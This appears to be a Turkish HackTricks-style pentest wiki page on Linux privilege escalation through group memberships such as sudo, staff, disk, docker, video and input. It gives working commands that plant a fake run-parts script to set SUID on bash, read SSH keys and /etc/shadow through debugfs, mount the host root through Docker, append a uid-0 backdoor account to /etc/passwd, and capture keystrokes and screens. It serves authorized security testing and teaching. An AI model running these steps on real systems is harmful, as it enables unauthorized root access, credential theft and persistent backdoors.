# İlginç Gruplar - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Yönetici Grupları

### **PE - Method 1**

**Bazen**, bir sistemin **/etc/sudoers** politikası (veya bu dosyaya dahil edilen bir dosya) şu tür girdiler içerir:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Bu, iki girdiden herhangi biriyle eşleşen her kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için yalnızca şunu çalıştırabilirsiniz**:

```
sudo su
```

`sudo -l`, yalnızca bir kullanıcı adıyla sınırlandırılmış `adduser` kullanımına izin veriyorsa, henüz mevcut olmayan aynı adlı bir primary group oluşturup oluşturmadığını kontrol edin. Bu gruptaki yeni bir hesap, etkin sudoers policy `%group` için zaten yetki veriyorsa ayrıcalık kazanabilir; bunu bir privilege escalation yolu olarak değerlendirmeden önce hem grubun oluşturulma davranışını hem de grup kuralını doğrulayın. Hesap oluşturmak sistemi değiştirir, bu nedenle önce policy’yi inceleyin.

### PE - Method 2

Tüm suid binary’leri bulun ve **Pkexec** binary’si olup olmadığını kontrol edin:

```bash
find / -perm -4000 2>/dev/null
```

**pkexec bir SUID binary ise**, yalnızca polkit istenen eyleme izin verdiğinde başka bir kullanıcı olarak program çalıştırabilir; SUID biti tek başına root yetkisi sağlamaz. **sudo** veya **admin** üyeliğinin yeterli olduğunu varsaymak yerine, kurulu policy'yi ve hedef oturumun yetkilendirmesini kontrol edin.<sup>[[4]](#references)[[5]](#references)</sup>

Ayrı bir [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) yolu için önce `pkexec` dosyasının çalıştırılabilir ve **root sahipliğinde SUID** bir dosya olduğunu doğrulayın. Bu bit ayarlı olmayan kurulu bir binary, güvenlik duyurusunda açıklanan yerel SUID yetki yükseltme yolu değildir. Upstream sürüm dizesi yalnızca bir ipucudur: dağıtımlar [düzeltmeyi daha eski paket sürümlerine backport edebilir](https://ubuntu.com/security/CVE-2021-4034); bu nedenle güvenlik açığı bulunduğuna karar vermeden önce kurulu vendor paketini ve azaltımları kontrol edin.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) farklı bir polkit yoludur: `pkexec` SUID açığı değil, bir D-Bus yetkilendirme yarış durumudur. Kurulu vendor polkit paketini ve erişilebilir, ayrıcalıklı bir D-Bus eyleminin işe yarar bir değişiklik yapıp yapamayacağını inceleyin; hesap oluşturma yolu ayrıca AccountsService gibi uygun bir hizmet gerektirir ve yeni bir grubun sudo erişimi, geçerli sudo policy'sine bağlıdır. Bildirilen polkit sürümü veya kurulu bir hizmet tek başına yalnızca olası bir adaydır; özellikle vendor'ların [düzeltmeleri backport ettiği](https://access.redhat.com/security/cve/cve-2021-3560) durumlarda. Pasif enumeration yarış durumunu tetiklememelidir.

Hâlâ eski Local Authority backend'ini kullanan dağıtımlarda, grup kurallarını şu komutla inceleyin:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

İlgili grup adları ve varsayılanlar dağıtıma göre değişir; bir grup burada yalnızca yerel politika onu tanımlıyorsa işe yarar.<sup>[[5]](#references)</sup>

**root olmak için şunu çalıştırabilirsiniz**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

**pkexec**'i çalıştırmayı denerseniz ve bu **hatayı** alırsanız:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Kayıtlı bir kimlik doğrulama aracısının bulunmadığı bir SSH oturumunda, ilke aksi hâlde eyleme izin verecek olsa bile `pkexec` bu hatayla başarısız olabilir; polkit, masaüstü olmayan oturumlar için metin tabanlı bir kimlik doğrulama aracısı olarak `pkttyagent`'ı belgeler. Kesin davranış sürüme ve dağıtıma bağlıdır; bu nedenle yerel ilkeyi ve aracı kurulumunu doğrulayın. Etkilenen NixOS sürümleri için bildirilen geçici çözümlerden biri **2 farklı SSH oturumu** kullanır.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Bir hesabın `su` erişimini engelleyen ACL, yönetici yetkisiyle izin verilen bir eyleme giden her yolu değil, yalnızca söz konusu yürütülebilir dosyayı denetler. Bir yönetici kimlik bilgisi bağımsız olarak açığa çıktıysa, `systemd-run` aracılığıyla geçici bir sistem hizmeti başlatmak gibi ayrı bir eyleme etkin polkit ilkesi kapsamında izin verilip verilmediğini, kimlik doğrulama aracısının hangi kimliği kabul ettiğini ve ortaya çıkan hizmetin hangi kimliği kullanacağını inceleyin. [Polkit, oturum sahibi olarak kimlik doğrulamayı yönetici olarak kimlik doğrulamadan ayırır](https://polkit.pages.freedesktop.org/polkit/polkit.8.html); [systemd-run ise sistem yöneticisinden geçici bir hizmet isteyebilir](https://systemd.io/CONTROL_GROUP_INTERFACE/). Geçmiş girdisi, kurulu bir komut veya okunabilir bir ilke dosyası tek başına yetkilendirmeyi ya da kimlik bilgilerinin geçerliliğini kanıtlamaz; pasif inceleme sırasında kimlik bilgilerini göndermeyin veya bir birim başlatmayın.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Grubu

Bazen bir sudoers politikası şu girdiyi de içerebilir:

```
%wheel	ALL=(ALL:ALL) ALL
```

Bu, girdinin eşleştiği herhangi bir kullanıcının `sudo` aracılığıyla herhangi bir hedef kullanıcı olarak herhangi bir komutu çalıştırabileceği anlamına gelir (politikanın geri kalanına tabidir).<sup>[[3]](#references)</sup>

Durum buysa, **root olmak için şunu çalıştırmanız yeterlidir**:

```
sudo su
```

## Shadow Grubu

İzinlerin buna olanak tanıdığı sistemlerde, **shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**; hedefteki gerçek izin kipini ve ACL'leri doğrulayın:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Yani dosyayı okuyun ve **bazı hash'leri crack etmeyi** deneyin.

Hash'leri incelerken kilit durumuyla ilgili kısa bir ayrıntı:
- `!` veya `*` içeren girdiler genellikle parola ile etkileşimli oturum açmaya izin vermez.
- `!hash`, parolanın kilitlendiği anlamına gelir; kalan karakterler, kilitlenmeden önce parola alanında bulunan değeri temsil eder.
- `*` içeren bir alan geçerli bir `crypt(3)` hash'i değildir ve UNIX parolasıyla oturum açmayı engeller; parolanın daha önce ayarlanmış olup olmadığı konusunda bu alandan çıkarım yapmayın.
Doğrudan oturum açma engellendiğinde bile bu bilgi hesapları sınıflandırmada faydalıdır.<sup>[[6]](#references)</sup>

## Staff Grubu

**staff**: Kullanıcıların root ayrıcalıklarına ihtiyaç duymadan sistemde (`/usr/local`) yerel değişiklikler yapmasına olanak tanır (`/usr/local/bin` içindeki çalıştırılabilir dosyaların her kullanıcının PATH değişkeninde bulunduğunu ve aynı ada sahip `/bin` ve `/usr/bin` içindeki çalıştırılabilir dosyaları "geçersiz kılabileceğini" unutmayın). Daha çok izleme/güvenlikle ilgili olan "adm" grubuyla karşılaştırın.<sup>[[2]](#references)[[7]](#references)</sup>

`/usr/local/bin` dizininin `PATH` içinde `/usr/bin` dizininden önce geldiği Debian yapılandırmalarında (aşağıdaki örneklerde olduğu gibi), tam yolu belirtilmeyen bir komut önce `/usr/local/bin` içindeki kopyaya çözülür; hedef sistemde etkin `PATH` değerini doğrulayın.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ayrıcalıklı bir işlem, tam yol belirtilmemiş bir komutu yazılabilir `/usr/local/bin` dizininde arıyorsa, bu komutu değiştirerek işlemin ayrıcalıklarıyla kod çalıştırılabilir; test etmeden önce gerçek yolu ve tetikleyiciyi doğrulayın.

Ubuntu sistemlerinde `pam_motd`, oturum açıldığında çalıştırılabilir betikleri root olarak `run-parts --lsbsysinit` aracılığıyla çalıştırır; cron işleri de `run-parts` kullanabilir, ancak bu dağıtıma ve yapılandırmaya bağlıdır.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Yeni bir SSH oturum açıldığında `pspy`, bu yolun hedefte gerçekten çağrılıp çağrılmadığını doğrulamaya yardımcı olabilir; root olmadan süreç komut satırlarını gözlemleyebilir.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Grubu

**disk** grubuna üyelik, blok aygıtlara ham erişim sağlayabilir ve çoğu zaman **root erişimine yakındır**; Debian, bunun büyük ölçüde root ile eşdeğer olduğunu belirtir, ancak hedefteki gerçek aygıt izinlerini ve depolama düzenini doğrulayın.<sup>[[7]](#references)</sup>

Yaygın aygıt yolları arasında `/dev/sd*` bulunur, ancak NVMe ve diğer depolama düzenlerinde farklı adlar kullanılır.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs`, ext2/ext3/ext4 dosya sistemlerinde çalışır; yukarıdaki `/root` ve `/etc/shadow` gibi yollar, açılan dosya sisteminin içindeki dosyalardır. `dump` komutunun ikinci argümanı ise yerel dosya sistemindeki bir çıktı yoludur.<sup>[[8]](#references)</sup> Örneğin bu komut, açılan dosya sistemindeki `/tmp/asd1.txt` dosyasını yerel dosya sistemindeki `/tmp/asd2.txt` konumuna çıkarır:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` seçeneği dosya sistemini okuma-yazma modunda açar ve `write` komutu yerel bir dosyayı açılan dosya sistemine kopyalar. Dosya sistemini bozabileceğinden, bağlı ve etkin bir dosya sistemi üzerinde doğrudan düzenleme yapmaktan kaçının; mümkün olduğunda çevrimdışı bir imaj üzerinde çalışın.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilir ve aşağıdakine benzer bir çıktı görebilirsiniz.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** girdisi ilk Linux sanal konsolunu belirtir; özellikle container'larda veya diğer ortamlarda, tek başına makinenin başında fiziksel olarak bir kullanıcı bulunduğunu kanıtlamaz.<sup>[[21]](#references)</sup>

Okunabilir bir framebuffer device sunan sistemlerde, **video** grubuna üyelik bu device'a erişim sağlayabilir. Linux framebuffer arayüzü, `/dev/fb0`'ı ekran görüntüsü almak için kopyalanabilen okunabilir bir bellek device'ı olarak belgeler; `/sys/class/graphics/fb0/virtual_size` yolu yalnızca ilgili fbdev sysfs attribute'unun bulunduğu sistemlerde kullanılabilir, bu nedenle önce hedefi kontrol edin.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Yüklü **GIMP** sürümünde ham veri içe aktarıcısı varsa, **`screen.raw`** dosyasını bu içe aktarıcıyla açın; destek ve denetimler sürüme ve eklentiye göre değişir.<sup>[[22]](#references)</sup>

![Disk Grubu - Video Grubu: Ham görüntüyü açmak için GIMP'i kullanabilir, screen.raw dosyasını seçip dosya türü olarak Raw image data'yı seçebilirsiniz](<../../../images/image (463).png>)

Görüntü genişliğini ve yüksekliğini framebuffer geometrisiyle eşleşecek şekilde ayarlayın; çıktı okunaklı olana kadar kullanılabilir pixel formatlarını/Image Types seçeneklerini deneyin.<sup>[[9]](#references)</sup>

![Disk Grubu - Video Grubu: Ardından Width ve Height değerlerini ekranda kullanılan değerlere göre değiştirin ve farklı Image Types seçeneklerini deneyin (ekranı en iyi göstereni seçin)](<../../../images/image (317).png>)

## Girdi Grubu

`input` grubuna klavye olay aygıtlarına okuma erişimi veren sistemlerde, grup üyesi bu aygıttan gelen ham tuş vuruşlarını gözlemleyebilir. Önce gerçek dosya modunu ve ACL'yi kontrol edin: etkin bir yerel oturum, bunun yerine `uaccess` ACL aracılığıyla erişim sağlayabilir; yalnızca grup adı erişimi garanti etmez.<sup>[[23]](#references)[[24]](#references)</sup>

Klavyenin `eventX` işleyicisini bulun, mevcut hesabın ilgili aygıt düğümünü okuyabildiğini doğrulayın, ardından `evtest` ile kısa ve yetkilendirilmiş bir test izleyin. **`--grab` kullanmayın**: bu seçenek aygıta özel erişim alır ve diğer uygulamaların girdi almasını engelleyebilir.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY`, tamamlanmış metin yerine tuş kodlarını bildirir: `1` basma, `0` bırakma ve `2` tekrarlama anlamına gelir. Bu, aynı fiziksel klavyeyi kullanan başka bir oturumda yazılan tuşları, kimlik bilgileri de dahil olmak üzere, açığa çıkarabilir; ancak tek başına root erişimi sağlamaz. Bir masaüstü compositor'ı, ham cihaz düğümüne erişimi ortadan kaldırmaz.<sup>[[25]](#references)</sup>

Daha kapsamlı kimlik ve oturum kontrolleri için [kullanıcılar ve oturumlar](../user-and-session-triage.md) sayfasına bakın.

## Root Grubu

**root** grubuna üyelik, root'un UID'sini sağlamaz; ancak root'a ait grup tarafından yazılabilir dosyalar, ayrıcalıklı servisler veya kütüphaneler tarafından kullanıldıklarında yine de ilgi çekici olabilir. Bir dosyayı ayrıcalık yükseltme yolu olarak değerlendirmeden önce gerçek izinlerini ve nasıl kullanıldığını doğrulayın.

**Root grubu üyelerinin hangi dosyaları değiştirebildiğini kontrol edin**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

`docker` grubuna üyelik, standart rootful kurulumlarda Docker daemon'ına root düzeyinde erişim sağlar. Bind mount'lar varsayılan olarak okuma-yazma olduğundan, daemon'ı denetleyebilen bir kullanıcı host'un `/` dizinini bir container'a bağlayıp host dosyalarını değiştirebilir; bu da host üzerinde root yetkisi verir.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Grup üyeliği `/etc/group`, `/etc/gshadow` ve mevcut süreç belirteci arasında uyuşmayabilir. Kullanıcı `id -nG` çıktısında görünmüyor ancak `newgrp docker` başarılı oluyorsa, yeni kabukta `id` komutunun gösterdiği grubu kontrol edin ve Docker socket'inin gerçekten yazılabilir olup olmadığını ve rootful bir daemon'a hizmet verip vermediğini test edin. Tek başına grup adı, host üzerinde denetim yetkisi olduğunu göstermez. Otomatik `newgrp` yoklamalarını, parola isteminin enumerasyonu durdurmasını önleyecek şekilde sınırlandırın.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Son olarak, önceki önerilerden hiçbirini beğenmezseniz veya herhangi bir nedenle işe yaramazlarsa (docker api firewall?), burada açıklandığı gibi **privileged bir container çalıştırıp içinden escape etmeyi** deneyebilirsiniz:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Docker socket üzerinde yazma izniniz varsa, [**docker socket'ini kötüye kullanarak yetkilerin nasıl yükseltileceğini anlatan bu yazıyı**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)** okuyun.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grubu

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Grubu

Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ içindeki **log** dosyalarını **okuma** iznine sahiptir.\
Bu nedenle, bu gruptaki bir kullanıcıyı ele geçirdiyseniz kesinlikle **loglara göz atmalısınız**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail grupları

Bu grupların anlamları kullanılan hizmete ve dağıtıma özeldir. Debian, `backup` grubunu devredilmiş yedekleme/geri yükleme işlemleri, `lp` grubunu yazıcı daemon'ları ve `mail` grubunu `/var/mail` için tanımlar. Bu nedenle, grup üyeliğini bir yetki yükseltme yolu olarak değerlendirmeden önce yerel izinleri kontrol edin.<sup>[[7]](#references)</sup>

Bunlar doğrudan root'a erişim sağlamaktan çok, **kimlik bilgilerini keşfetme** yollarıdır:
- **backup**: Yapılandırma dosyaları, anahtarlar, DB dökümleri veya token'lar içeren arşivleri açığa çıkarabilir.
- **operator**: Platforma özgü operasyonel erişim, hassas çalışma zamanı verilerini leak edebilir.
- **lp**: Yazdırma kuyrukları/spool'ları belge içeriklerini barındırabilir.
- **mail**: Mail spool'ları parola sıfırlama bağlantılarını, OTP'leri ve dahili kimlik bilgilerini açığa çıkarabilir.

Buradaki grup üyeliğini yüksek değerli bir veri ifşası bulgusu olarak değerlendirin ve parola/token tekrar kullanımı üzerinden pivot edin.

## Auth Grubu

OpenBSD'de S/Key yapılandırıldığında `/etc/skey`, `root:auth` tarafından sahiplenilir ve kayıtlarına erişmek için `auth` grubu gerekir; YubiKey kayıtları `/var/db/yubikey` içinde tutulur.<sup>[[16]](#references)[[17]](#references)</sup> S/Key veya YubiKey etkinleştirilmiş, güvenlik açığı bulunan bir OpenBSD 6.6 yapılandırması, `auth` yetkilerine sahip yerel kullanıcıların root olmasına olanak tanıyordu. Qualys ön koşulları ve exploit zincirini belgeliyor; bağlantıdaki PoC bunu uyguluyor.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [GUI oturumu olmadan pkexec/pkttyagent kimlik doğrulaması (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian'ı Güvenli Hale Getirme Kılavuzu](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux kılavuz sayfası](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Frame Buffer Aygıtı — Linux Kernel belgeleri](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — yetkisiz Linux süreçlerini izleme](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine güvenliği](https://docs.docker.com/engine/security/)
- [14] [Docker'ı root olmayan kullanıcı olarak yönetme](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Container çalıştırma — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD kılavuz sayfaları](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD kılavuz sayfaları](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD'deki kimlik doğrulama güvenlik açıkları — Qualys güvenlik duyurusu](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — yerel exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux ayrılmış aygıtları (4.x+ sürümü)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Görüntü içe ve dışa aktarma — GIMP belgeleri](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [beep aygıtı izinleriyle ilgili yönergeler — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — systemd kılavuzu](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Giriş olay kodları — Linux kernel belgeleri](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Debian Manpages](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
